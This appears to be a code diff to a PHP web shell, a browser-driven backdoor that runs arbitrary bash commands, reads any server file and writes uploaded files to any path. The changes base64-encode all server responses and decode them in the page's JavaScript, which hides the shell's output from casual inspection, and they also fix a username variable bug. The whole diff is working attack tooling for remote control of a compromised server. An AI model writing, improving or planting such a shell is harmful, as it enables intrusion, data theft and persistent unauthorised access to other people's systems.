@@ -76,13 +76,13 @@ function featureShell($cmd, $cwd) {
     }
 
     return array(
-        "stdout" => $stdout,
-        "cwd" => getcwd()
+        "stdout" => base64_encode($stdout),
+        "cwd" => base64_encode(getcwd())
     );
 }
 
 function featurePwd() {
-    return array("cwd" => getcwd());
+    return array("cwd" => base64_encode(getcwd()));
 }
 
 function featureHint($fileName, $cwd, $type) {
@@ -94,6 +94,9 @@ function featureHint($fileName, $cwd, $type) {
     }
     $cmd = "/bin/bash -c \"$cmd\"";
     $files = explode("\n", shell_exec($cmd));
+    foreach ($files as &$filename) {
+        $filename = base64_encode($filename);
+    }
     return array(
         'files' => $files,
     );
@@ -103,12 +106,12 @@ function featureDownload($filePath) {
     $file = @file_get_contents($filePath);
     if ($file === FALSE) {
         return array(
-            'stdout' => array('File not found / no read permission.'),
-            'cwd' => getcwd()
+            'stdout' => base64_encode('File not found / no read permission.'),
+            'cwd' => base64_encode(getcwd())
         );
     } else {
         return array(
-            'name' => basename($filePath),
+            'name' => base64_encode(basename($filePath)),
             'file' => base64_encode($file)
         );
     }
@@ -119,15 +122,15 @@ function featureUpload($path, $file, $cwd) {
     $f = @fopen($path, 'wb');
     if ($f === FALSE) {
         return array(
-            'stdout' => array('Invalid path / no write permission.'),
-            'cwd' => getcwd()
+            'stdout' => base64_encode('Invalid path / no write permission.'),
+            'cwd' => base64_encode(getcwd())
         );
     } else {
         fwrite($f, base64_decode($file));
         fclose($f);
         return array(
-            'stdout' => array('Done.'),
-            'cwd' => getcwd()
+            'stdout' => base64_encode('Done.'),
+            'cwd' => base64_encode(getcwd())
         );
     }
 }
@@ -137,7 +140,7 @@ function initShellConfig() {
 
     if (isRunningWindows()) {
         $username = getenv('USERNAME');
-        if ($hostname !== false) {
+        if ($username !== false) {
             $SHELL_CONFIG['username'] = $username;
         }
     } else {
@@ -366,10 +369,10 @@ if (isset($_GET["feature"])) {
                 } else {
                     makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                         if (response.hasOwnProperty('file')) {
-                            featureDownload(response.name, response.file)
+                            featureDownload(atob(response.name), response.file)
                         } else {
-                            _insertStdout(response.stdout);
-                            updateCwd(response.cwd);
+                            _insertStdout(atob(response.stdout));
+                            updateCwd(atob(response.cwd));
                         }
                     });
                 }
@@ -380,7 +383,9 @@ if (isset($_GET["feature"])) {
 
                 function _requestCallback(data) {
                     if (data.files.length <= 1) return;  // no completion
-
+                    data.files = data.files.map(function(file){
+                        return atob(file);
+                    });
                     if (data.files.length === 2) {
                         if (type === 'cmd') {
                             eShellCmdInput.value = data.files[0];
@@ -430,8 +435,8 @@ if (isset($_GET["feature"])) {
                     var promise = getBase64(element.files[0]);
                     promise.then(function (file) {
                         makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
-                            _insertStdout(response.stdout.join("\n"));
-                            updateCwd(response.cwd);
+                            _insertStdout(atob(response.stdout));
+                            updateCwd(atob(response.cwd));
                         });
                     }, function () {
                         _insertStdout('An unknown client-side error occurred.');
@@ -467,7 +472,7 @@ if (isset($_GET["feature"])) {
                     return;
                 }
                 makeRequest("?feature=pwd", {}, function(response) {
-                    CWD = response.cwd;
+                    CWD = atob(response.cwd);
                     _updatePrompt();
                 });
 
